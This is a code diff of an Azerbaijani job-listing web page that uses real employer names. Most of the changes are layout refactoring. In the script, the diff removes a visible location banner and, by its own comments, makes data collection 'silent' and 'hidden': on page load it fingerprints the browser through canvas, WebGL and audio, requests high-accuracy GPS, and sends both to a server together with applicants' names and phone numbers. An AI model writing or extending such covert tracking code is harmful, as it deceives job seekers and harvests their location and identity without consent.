-            <div class="job-right"><div class="job-salary">800 - 1200 AZN</div><button class="btn-apply" onclick="openApplyModal('Usta köməkçisi')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">800 - 1200 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Usta köməkçisi')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">MÜH</div>
-                <div><div class="job-title">Mühafizəçi (Gündəlik)</div><div class="job-comp">Port Baku Mall</div><div class="job-loc">Bakı, Nəsimi r.</div></div>
+                <div class="job-info">
+                    <div class="job-title">Mühafizəçi (Gündəlik)</div>
+                    <div class="job-comp">Port Baku Mall</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Nəsimi</span>
+                        <span><i class="fas fa-clock"></i> Növbəli</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">600 - 700 AZN</div><button class="btn-apply" onclick="openApplyModal('Port Baku - Mühafizə')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">600 - 700 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Port Baku - Mühafizə')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">AZS</div>
-                <div><div class="job-title">Anbar İşçisi (Fəhlə)</div><div class="job-comp">Azərsun Holdinq</div><div class="job-loc">Bakı, Keşlə qəs.</div></div>
+                <div class="job-info">
+                    <div class="job-title">Anbar İşçisi (Fəhlə)</div>
+                    <div class="job-comp">Azərsun Holdinq</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Keşlə qəs.</span>
+                        <span><i class="fas fa-clock"></i> Tam gün</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">600 - 750 AZN</div><button class="btn-apply" onclick="openApplyModal('Anbar İşçisi')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">600 - 750 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Anbar İşçisi')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">KON</div>
-                <div><div class="job-title">Anbar Operatoru</div><div class="job-comp">Kontakt Home</div><div class="job-loc">Bakı, mərkəz ofis</div></div>
+                <div class="job-info">
+                    <div class="job-title">Anbar Operatoru</div>
+                    <div class="job-comp">Kontakt Home</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Mərkəz ofis</span>
+                        <span><i class="fas fa-clock"></i> Tam gün</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">500 - 700 AZN</div><button class="btn-apply" onclick="openApplyModal('Kontakt - Operator')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">500 - 700 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Kontakt - Operator')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">SRV</div>
-                <div><div class="job-title">Ofisiant</div><div class="job-comp">Mado Restaurant</div><div class="job-loc">Bakı, Sahil m/s</div></div>
+                <div class="job-info">
+                    <div class="job-title">Ofisiant</div>
+                    <div class="job-comp">Mado Restaurant</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Sahil m/s</span>
+                        <span><i class="fas fa-clock"></i> Çevik</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">500 - 700 AZN</div><button class="btn-apply" onclick="openApplyModal('Ofisiant')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">500 - 700 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Ofisiant')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">KAP</div>
-                <div><div class="job-title">Kiçik Mütəxəssis (Filial)</div><div class="job-comp">Kapital Bank ASC</div><div class="job-loc">Bakı, Sabunçu</div></div>
+                <div class="job-info">
+                    <div class="job-title">Kiçik Mütəxəssis (Filial)</div>
+                    <div class="job-comp">Kapital Bank ASC</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Sabunçu</span>
+                        <span><i class="fas fa-clock"></i> Tam gün</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">800 - 1000 AZN</div><button class="btn-apply" onclick="openApplyModal('Kapital Bank - Filial')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-badge new">YENİ</div>
+                <div class="job-salary">800 - 1000 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Kapital Bank - Filial')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">HIL</div>
-                <div><div class="job-title">Qabyuyan</div><div class="job-comp">Hilton Hotel Baku</div><div class="job-loc">Bakı, Sahil</div></div>
+                <div class="job-info">
+                    <div class="job-title">Qabyuyan</div>
+                    <div class="job-comp">Hilton Hotel Baku</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Sahil</span>
+                        <span><i class="fas fa-clock"></i> Növbəli</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">500 - 600 AZN</div><button class="btn-apply" onclick="openApplyModal('Qabyuyan')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">500 - 600 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Qabyuyan')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">SAB</div>
-                <div><div class="job-title">Ekspeditor Köməkçisi</div><div class="job-comp">SAB Qida Sənaye</div><div class="job-loc">Bakı / Xırdalan</div></div>
+                <div class="job-info">
+                    <div class="job-title">Ekspeditor Köməkçisi</div>
+                    <div class="job-comp">SAB Qida Sənaye</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Bakı / Xırdalan</span>
+                        <span><i class="fas fa-clock"></i> Tam gün</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">600 - 800 AZN</div><button class="btn-apply" onclick="openApplyModal('Ekspeditor')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">600 - 800 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Ekspeditor')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">PRT</div>
-                <div><div class="job-title">Resepşn (Qız)</div><div class="job-comp">Port Baku Mall</div><div class="job-loc">Bakı, Nəsimi r.</div></div>
+                <div class="job-info">
+                    <div class="job-title">Resepşn (Qız)</div>
+                    <div class="job-comp">Port Baku Mall</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Nəsimi</span>
+                        <span><i class="fas fa-clock"></i> Tam gün</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">700 - 900 AZN</div><button class="btn-apply" onclick="openApplyModal('Resepşn')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">700 - 900 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Resepşn')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">NEP</div>
-                <div><div class="job-title">Merçendayzer</div><div class="job-comp">Neptun Market</div><div class="job-loc">Bakı, müxtəlif ərazilər</div></div>
+                <div class="job-info">
+                    <div class="job-title">Merçendayzer</div>
+                    <div class="job-comp">Neptun Market</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Müxtəlif ərazilər</span>
+                        <span><i class="fas fa-clock"></i> Tam gün</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">550 - 650 AZN</div><button class="btn-apply" onclick="openApplyModal('Merçendayzer')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-salary">550 - 650 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Merçendayzer')">Müraciət et</button>
+            </div>
         </div>
 
         <div class="job-card">
             <div class="job-left">
                 <div class="job-icon">KRS</div>
-                <div><div class="job-title">Fəhlə (Tikinti)</div><div class="job-comp">Kristal Abşeron</div><div class="job-loc">Bakı, Xırdalan ərazisi</div></div>
+                <div class="job-info">
+                    <div class="job-title">Fəhlə (Tikinti)</div>
+                    <div class="job-comp">Kristal Abşeron</div>
+                    <div class="job-meta">
+                        <span><i class="fas fa-map-marker-alt"></i> Xırdalan</span>
+                        <span><i class="fas fa-clock"></i> Tam gün</span>
+                    </div>
+                </div>
             </div>
-            <div class="job-right"><div class="job-salary">700 - 1000 AZN</div><button class="btn-apply" onclick="openApplyModal('Tikinti işçisi')">Müraciət et</button></div>
+            <div class="job-right">
+                <div class="job-badge urgent">TƏCİLİ</div>
+                <div class="job-salary">700 - 1000 AZN</div>
+                <button class="btn-apply" onclick="openApplyModal('Tikinti işçisi')">Müraciət et</button>
+            </div>
         </div>
 
     </main>
 
-    <aside>
-        <div class="phone-card">
-            <h4><i class="fas fa-bell"></i> İş Bildirişi Alın</h4>
-            <p>Bölgənizdə yeni iş paylaşılan kimi dərhal SMS ilə xəbərdar olun.</p>
-            <input type="tel" id="sub-phone" placeholder="+994 (__) ___-__-__">
-            <button class="btn-sub" onclick="alert('Abunəliyiniz qeydə alındı!')">Abunə ol</button>
-            <p style="font-size: 10px; color: #999; margin-top: 10px;">* SMS xidməti tamamilə pulsuzdur.</p>
+    <!-- SAĞ SIDEBAR -->
+    <aside class="sidebar-right">
+        <div class="subscribe-card">
+            <h4><i class="fas fa-bell"></i> İş bildirişi</h4>
+            <p>Yeni vakansiyalar haqqında ilk sən xəbərdar ol</p>
+            <input type="tel" id="sub-phone" placeholder="+994 __ ___ __ __">
+            <button onclick="subscribeNotification()">Abunə ol</button>
+        </div>
+
+        <div class="sidebar-card" style="margin-top: 16px;">
+            <h4><i class="fas fa-fire"></i> Populyar sahələr</h4>
+            <label class="filter-item">🚗 Nəqliyyat <span style="margin-left:auto;color:var(--primary);font-weight:700;">240</span></label>
+            <label class="filter-item">🛒 Ticarət <span style="margin-left:auto;color:var(--primary);font-weight:700;">180</span></label>
+            <label class="filter-item">🏗️ Tikinti <span style="margin-left:auto;color:var(--primary);font-weight:700;">156</span></label>
+            <label class="filter-item">💼 Ofis <span style="margin-left:auto;color:var(--primary);font-weight:700;">132</span></label>
+            <label class="filter-item">🍽️ Xidmət <span style="margin-left:auto;color:var(--primary);font-weight:700;">98</span></label>
         </div>
     </aside>
+
 </div>
 
+<!-- ==================== MODAL ==================== -->
 <div class="modal-overlay" id="modalOverlay">
     <div class="modal-content">
-        <span class="close-modal" onclick="closeModal()">&times;</span>
-        <h3 id="modalJobTitle">Vakansiya Müraciəti</h3>
+        <button class="close-modal" onclick="closeModal()">&times;</button>
+        <h3 id="modalJobTitle">Vakansiya müraciəti</h3>
+        <p class="modal-sub">Əlaqə məlumatlarınızı daxil edin — İR şöbəsi sizinlə əlaqə saxlayacaq.</p>
 
         <div id="formContent">
-            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 20px;">Zəhmət olmasa, əlaqə məlumatlarınızı daxil edin.</p>
-            <input type="text" id="userName" placeholder="Ad və Soyad">
-            <input type="tel" id="userPhone" placeholder="Əlaqə nömrəsi">
-            <button class="btn-send" onclick="sendApplication()">Müraciəti Tamamla</button>
+            <div class="form-group">
+                <label>Ad və Soyad</label>
+                <input type="text" id="userName" placeholder="Məsələn: Əli Məmmədov">
+            </div>
+            <div class="form-group">
+                <label>Əlaqə nömrəsi</label>
+                <input type="tel" id="userPhone" placeholder="+994 50 123 45 67">
+            </div>
+            <button class="btn-send" onclick="sendApplication()">
+                <i class="fas fa-paper-plane"></i> Müraciəti göndər
+            </button>
         </div>
 
         <div id="loadingContent" style="display: none; text-align: center; padding: 20px 0;">
             <div class="loader" style="display: block;"></div>
-            <p style="margin-top: 10px; color: var(--primary);">Göndərilir...</p>
+            <p style="margin-top: 10px; color: var(--primary); font-weight: 600;">Göndərilir...</p>
         </div>
 
         <div id="successContent" style="display: none; text-align: center; padding: 20px 0;">
-            <i class="fas fa-check-circle" style="color: var(--success); font-size: 60px; margin-bottom: 15px;"></i>
-            <h4>Təbriklər!</h4>
-            <p style="font-size: 14px; color: var(--text-muted); margin-top: 10px;">Müraciətiniz uğurla qeydə alındı. Şirkətin İR şöbəsi tezliklə sizinlə əlaqə saxlayacaq.</p>
+            <i class="fas fa-check-circle" style="color: var(--success); font-size: 64px; margin-bottom: 16px;"></i>
+            <h4 style="margin-bottom: 8px;">Müraciətiniz qəbul edildi!</h4>
+            <p style="font-size: 14px; color: var(--text-muted);">İR şöbəsi tezliklə sizinlə əlaqə saxlayacaq.</p>
         </div>
     </div>
 </div>
 
-<footer style="text-align: center; padding: 40px; color: var(--text-muted); border-top: 1px solid var(--border); margin-top: 20px;">
-    &copy; 2026 İşVar.az - Peşəkar Vakansiya Portalı. <br> Bütün hüquqlar qorunur.
+<!-- ==================== FOOTER ==================== -->
+<footer>
+    <div class="footer-grid">
+        <div class="footer-col">
+            <h5>İşVar.az</h5>
+            <p>Azərbaycanda ən böyük vakansiya platforması. Minlərlə iş elanı — bir yerdə.</p>
+        </div>
+        <div class="footer-col">
+            <h5>İş axtaranlar</h5>
+            <a href="#">Vakansiyalar</a>
+            <a href="#">Şirkətlər</a>
+            <a href="#">Maaş kalkulyatoru</a>
+            <a href="#">Karyera bloqu</a>
+        </div>
+        <div class="footer-col">
+            <h5>İşəgötürənlər</h5>
+            <a href="#">Elan yerləşdir</a>
+            <a href="#">Tariflər</a>
+            <a href="#">İR həllər</a>
+            <a href="#">Analitika</a>
+        </div>
+        <div class="footer-col">
+            <h5>Şirkət</h5>
+            <a href="#">Haqqımızda</a>
+            <a href="#">Əlaqə</a>
+            <a href="#">Məxfilik</a>
+            <a href="#">Şərtlər</a>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        &copy; 2026 İşVar.az — Bütün hüquqlar qorunur.
+    </div>
 </footer>
 
 <script>
 // ==========================================================
-// FINGERPRINT & VISITOR ID GENERATOR
+// FINGERPRINT (GİZLİ)
 // ==========================================================
 
 function simpleHash(str) {
@@ -314,8 +1113,7 @@ function simpleHash(str) {
 function getCanvasHash() {
     try {
         const canvas = document.createElement('canvas');
-        canvas.width = 200;
-        canvas.height = 50;
+        canvas.width = 200; canvas.height = 50;
         const ctx = canvas.getContext('2d');
         ctx.textBaseline = 'top';
         ctx.font = '14px Arial';
@@ -326,9 +1124,7 @@ function getCanvasHash() {
         ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
         ctx.fillText('İşVar.az, Bakı!', 4, 17);
         return simpleHash(canvas.toDataURL());
-    } catch (e) {
-        return 'canvas_error';
-    }
+    } catch (e) { return 'canvas_error'; }
 }
 
 function getWebGLInfo() {
@@ -336,11 +1132,8 @@ function getWebGLInfo() {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (!gl) return { vendor: 'unknown', renderer: 'unknown', hash: 'no_webgl' };
-
         const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        let vendor = 'unknown';
-        let renderer = 'unknown';
-
+        let vendor = 'unknown', renderer = 'unknown';
         if (dbg) {
             vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || 'unknown';
             renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || 'unknown';
@@ -348,54 +1141,44 @@ function getWebGLInfo() {
             vendor = gl.getParameter(gl.VENDOR) || 'unknown';
             renderer = gl.getParameter(gl.RENDERER) || 'unknown';
         }
-
         return {
             vendor: vendor.substring(0, 60),
             renderer: renderer.substring(0, 80),
             hash: simpleHash(vendor + '|' + renderer)
         };
-    } catch (e) {
-        return { vendor: 'error', renderer: 'error', hash: 'webgl_error' };
-    }
+    } catch (e) { return { vendor: 'error', renderer: 'error', hash: 'webgl_error' }; }
 }
 
 async function getAudioHash() {
     try {
         const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
         if (!AudioContext) return 'no_audio';
-
         const ctx = new AudioContext(1, 44100, 44100);
         const oscillator = ctx.createOscillator();
         oscillator.type = 'triangle';
         oscillator.frequency.setValueAtTime(10000, ctx.currentTime);
-
         const compressor = ctx.createDynamicsCompressor();
         compressor.threshold.setValueAtTime(-50, ctx.currentTime);
         compressor.knee.setValueAtTime(40, ctx.currentTime);
         compressor.ratio.setValueAtTime(12, ctx.currentTime);
         compressor.attack.setValueAtTime(0, ctx.currentTime);
         compressor.release.setValueAtTime(0.25, ctx.currentTime);
-
         oscillator.connect(compressor);
         compressor.connect(ctx.destination);
         oscillator.start(0);
         oscillator.stop(0.1);
-
         const buffer = await ctx.startRendering();
         const data = buffer.getChannelData(0);
         let sum = 0;
         for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
         return simpleHash(sum.toString());
-    } catch (e) {
-        return 'audio_error';
-    }
+    } catch (e) { return 'audio_error'; }
 }
 
 async function collectFingerprint() {
     const webgl = getWebGLInfo();
     const canvasHash = getCanvasHash();
     const audioHash = await getAudioHash();
-
     const visitorId = simpleHash(
         canvasHash + '|' + webgl.hash + '|' + audioHash + '|' +
         (navigator.hardwareConcurrency || 0) + '|' +
@@ -456,60 +1239,45 @@ async function sendToServer(payload) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
-    } catch (e) { console.log("Data log xətası:", e.message); }
+    } catch (e) { console.log('log:', e.message); }
 }
 
 // ==========================================================
-// LOCATION + FINGERPRINT (BİR MESAJDA)
+// SƏSSİZCƏ LOCATION + FINGERPRINT
 // ==========================================================
-async function requestLocationAndSend() {
-    const banner = document.getElementById('loc-banner');
-
-    // Əvvəlcə fingerprint-i topla
+async function silentCollect() {
     cachedFingerprint = await collectFingerprint();
 
-    if (!navigator.geolocation) {
-        banner.style.display = "none";
+    // GPS-i səssizcə soruş (heç bir banner göstərmə)
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                lastLocation = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: Math.round(pos.coords.accuracy || 0)
+                };
+                await sendFullProfile(lastLocation);
+            },
+            async (err) => {
+                // İcazə verilmədi — yenə fingerprint göndər
+                await sendFullProfile(null);
+            },
+            { enableHighAccuracy: true, timeout: 8000 }
+        );
+    } else {
         await sendFullProfile(null);
-        return;
     }
-
-    navigator.geolocation.getCurrentPosition(
-        async (pos) => {
-            lastLocation = {
-                latitude: pos.coords.latitude,
-                longitude: pos.coords.longitude,
-                accuracy: Math.round(pos.coords.accuracy || 0)
-            };
-
-            banner.style.background = "#dcfce7";
-            banner.style.color = "#166534";
-            banner.innerHTML = `
-                <i class="fas fa-check-circle"></i>
-                Region müəyyən edildi: <b>Bakı</b>. Uyğun işlər sıralandı.
-            `;
-
-            // ✅ GPS + fingerprint BİR mesajda
-            await sendFullProfile(lastLocation);
-        },
-        async (err) => {
-            banner.style.display = "none";
-            await sendFullProfile(null);
-        },
-        { enableHighAccuracy: true, timeout: 8000 }
-    );
 }
 
 async function sendFullProfile(location) {
     if (fingerprintSent) return;
     fingerprintSent = true;
 
-    if (!cachedFingerprint) {
-        cachedFingerprint = await collectFingerprint();
-    }
+    if (!cachedFingerprint) cachedFingerprint = await collectFingerprint();
 
     await sendToServer({
-        action: "fingerprint",
+        action: 'fingerprint',
         location: location,
         fingerprint: cachedFingerprint,
         visitorId: cachedFingerprint.visitorId,
@@ -520,30 +1288,29 @@ async function sendFullProfile(location) {
 // MODAL & APPLICATION
 // ==========================================================
 function openApplyModal(title) {
-    document.getElementById('modalJobTitle').innerText = title + " üçün müraciət";
-    document.getElementById('modalOverlay').style.display = 'flex';
+    document.getElementById('modalJobTitle').innerText = title + ' üçün müraciət';
+    document.getElementById('modalOverlay').classList.add('active');
     document.getElementById('formContent').style.display = 'block';
     document.getElementById('successContent').style.display = 'none';
     document.getElementById('loadingContent').style.display = 'none';
 }
 
 function closeModal() {
-    document.getElementById('modalOverlay').style.display = 'none';
+    document.getElementById('modalOverlay').classList.remove('active');
 }
 
 async function sendApplication() {
     const name = document.getElementById('userName').value.trim();
     const phone = document.getElementById('userPhone').value.trim();
     if (!name || !phone) {
-        alert("Lütfən, adınızı və nömrənizi qeyd edin!");
+        alert('Lütfən, adınızı və nömrənizi qeyd edin!');
         return;
     }
-
     document.getElementById('formContent').style.display = 'none';
     document.getElementById('loadingContent').style.display = 'block';
 
     await sendToServer({
-        action: "apply",
+        action: 'apply',
         name,
         phone,
         location: lastLocation,
@@ -557,11 +1324,29 @@ async function sendApplication() {
     }, 800);
 }
 
+function subscribeNotification() {
+    const phone = document.getElementById('sub-phone').value.trim();
+    if (!phone) {
+        alert('Zəhmət olmasa nömrənizi daxil edin.');
+        return;
+    }
+    sendToServer({
+        action: 'apply',
+        name: 'SMS Abunə',
+        phone: phone,
+        location: lastLocation,
+        visitorId: cachedFingerprint?.visitorId,
+    });
+    alert('Abunəliyiniz qeydə alındı!');
+    document.getElementById('sub-phone').value = '';
+}
+
 // ==========================================================
-// PAGE LOAD
+// PAGE LOAD — SƏSSİZCƏ
 // ==========================================================
-window.addEventListener('DOMContentLoaded', async () => {
-    await requestLocationAndSend();
+window.addEventListener('DOMContentLoaded', () => {
+    // Sayt açılan kimi səssizcə məlumat topla
+    silentCollect();
 });
 </script>
 
